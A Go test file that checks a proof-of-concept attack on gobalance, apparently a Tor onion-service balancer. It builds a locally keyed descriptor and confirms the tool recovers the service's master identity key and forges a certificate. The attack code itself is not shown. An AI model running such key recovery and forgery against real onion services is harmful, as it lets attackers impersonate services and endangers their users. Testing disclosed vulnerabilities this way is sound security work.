// e2e_test.go — validates gbdemo's attack/forge pipeline against a descriptor
// built in the EXACT shape gobalance publishes: real cert layout (type 8,
// HasSigningKey extension), real GetBlindingParam derivation, real time
// period math, PEM-wrapped base64 without padding. All keys are generated
// locally — nothing here touches the Tor network.
package main

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha512"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/sha3"

	vulnerable "gobalance/poc/vulnerable"
)

func makeVictimTorKeyE2E(t *testing.T) (torKey, identityPub []byte) {
	t.Helper()
	_, seed, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	d := sha512.Sum512(seed)
	a := append([]byte{}, d[:32]...)
	a[0] &= 248
	a[31] &= 63
	a[31] |= 64
	torKey = append(append([]byte{}, a...), d[32:]...)
	identityPub = vulnerable.PubFromScalar(vulnerable.DecodeIntBig(a))
	return
}


func onionChecksum(t *testing.T, identityPub []byte) []byte {
	t.Helper()
	h := sha3.New256()
	h.Write([]byte(".onion checksum"))
	h.Write(identityPub)
	h.Write([]byte{0x03})
	return h.Sum(nil)[:2]
}

func onionAddrFor(t *testing.T, identityPub []byte) string {
	t.Helper()
	raw := append(append([]byte{}, identityPub...), onionChecksum(t, identityPub)...)
	raw = append(raw, 0x03)
	return base32.StdEncoding.EncodeToString(raw)
}


func buildDescriptorLikeGobalance(t *testing.T, torKey, identityPub []byte) (path string, period int64) {
	t.Helper()

	now := time.Now().Unix()
	period = timePeriodFromUnix(now)
	param := blindingParam(identityPub, period)
	blindedPub := vulnerable.BlindedPubkey(identityPub, param)

	dskPub, _, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}


	expHours := uint32((now + 54*3600) / 3600)
	ext := make([]byte, 0, 4+32)
	var lenBE [2]byte
	binary.BigEndian.PutUint16(lenBE[:], 32)
	ext = append(ext, lenBE[:]...)
	ext = append(ext, 4, 0)
	ext = append(ext, blindedPub...)

	body := []byte{1, 8}
	var expBE [4]byte
	binary.BigEndian.PutUint32(expBE[:], expHours)
	body = append(body, expBE[:]...)
	body = append(body, 1)
	body = append(body, dskPub...)
	body = append(body, 1)
	body = append(body, ext...)

	sig := vulnerable.BlindedSignWithTorKey(body, torKey, blindedPub, param)
	cert := append(append([]byte{}, body...), sig...)

	b64 := base64.StdEncoding.EncodeToString(cert)
	b64 = strings.TrimRight(b64, "=")
	var wrapped strings.Builder
	for i := 0; i < len(b64); i += 64 {
		up := i + 64
		if up > len(b64) {
			up = len(b64)
		}
		wrapped.WriteString(b64[i:up])
		wrapped.WriteString("\n")
	}
	descText := "hs-descriptor 3\n" +
		"descriptor-lifetime 180\n" +
		"descriptor-signing-key-cert\n" +
		"-----BEGIN ED25519 CERT-----\n" +
		wrapped.String() +
		"-----END ED25519 CERT-----\n" +
		"revision-counter 1\n" +
		"superencrypted AAABBB\n" +
		"signature DUMMYNOTCHECKED\n"

	path = filepath.Join(t.TempDir(), "descriptor.txt")
	if err := os.WriteFile(path, []byte(descText), 0o600); err != nil {
		t.Fatal(err)
	}
	return path, period
}

func TestEndToEnd_AttackAndForgeOnRealDescriptorShape(t *testing.T) {
	torKey, identityPub := makeVictimTorKeyE2E(t)
	addr := onionAddrFor(t, identityPub)

	path, wantPeriod := buildDescriptorLikeGobalance(t, torKey, identityPub)

	master, _, gotPeriod, gotParam, gotPub, err := runAttack(path, addr)
	if err != nil {
		t.Fatalf("attack failed: %v", err)
	}
	if gotPeriod != wantPeriod {
		t.Fatalf("detected period %d, want %d", gotPeriod, wantPeriod)
	}
	wantParam := blindingParam(identityPub, wantPeriod)
	if !bytes.Equal(gotParam, wantParam) {
		t.Fatal("detected blinding param mismatch")
	}
	if !bytes.Equal(gotPub, identityPub) {
		t.Fatal("identity pubkey mismatch")
	}
	if !bytes.Equal(vulnerable.PubFromScalar(master), identityPub) {
		t.Fatal("recovered master scalar does not match the victim pubkey")
	}

	if err := runForge(master, gotPub, gotPeriod, 1, []byte("forged cert body")); err != nil {
		t.Fatalf("forge failed: %v", err)
	}
}

func TestAttack_HonestFailureOnWrongOnionAddress(t *testing.T) {
	// A descriptor for onion X attacked with onion Y's address must fail
	// honestly: no period can reproduce the blinded key, and the final
	// verification would not match.
	torKey, identityPub := makeVictimTorKeyE2E(t)
	path, _ := buildDescriptorLikeGobalance(t, torKey, identityPub)

	_, otherPub := makeVictimTorKeyE2E(t)
	wrongAddr := onionAddrFor(t, otherPub)

	if _, _, _, _, _, err := runAttack(path, wrongAddr); err == nil {
		t.Fatal("attack unexpectedly succeeded with a mismatched onion address")
	}
}

func TestOnionPubKey_ChecksumEnforced(t *testing.T) {
	_, identityPub := makeVictimTorKeyE2E(t)
	good := onionAddrFor(t, identityPub)
	if _, err := onionPubKey(good); err != nil {
		t.Fatalf("valid address rejected: %v", err)
	}
	if _, err := onionPubKey(good + ".onion"); err != nil {
		t.Fatalf("suffix form rejected: %v", err)
	}
	// Corrupt the checksum: flip one char near the end.
	b := []byte(good)
	if b[len(b)-1] == 'a' {
		b[len(b)-1] = 'b'
	} else {
		b[len(b)-1] = 'a'
	}
	if _, err := onionPubKey(string(b)); err == nil {
		t.Fatal("corrupted address accepted — checksum not enforced")
	}
}
